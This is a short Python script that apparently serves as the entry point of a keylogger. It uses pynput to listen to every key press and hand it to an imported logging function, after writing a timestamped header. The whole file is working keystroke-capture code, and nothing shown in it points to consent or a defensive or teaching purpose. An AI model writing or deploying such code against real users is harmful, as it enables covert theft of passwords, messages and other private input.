from datetime import datetime
from python_logger import log
import pynput.keyboard as kb

if __name__ == "__main__":
    with kb.Listener(on_press=log) as listener:
        log(f'\n[{datetime.now().day if datetime.now().day >= 10 else "0"+str(datetime.now().day)}'
            f'/{datetime.now().month if datetime.now().month >= 10 else "0"+str(datetime.now().month)}'
            f'/{datetime.now().year} at '
            f'{datetime.now().hour if datetime.now().hour >= 10 else "0"+str(datetime.now().hour)}'
            f':{datetime.now().minute if datetime.now().minute >= 10 else "0"+str(datetime.now().minute)}'
            f':{datetime.now().second if datetime.now().second >= 10 else "0"+str(datetime.now().second)}] >>>')
        # DD/MM/YYYY at HH:MM:SS
        listener.join()
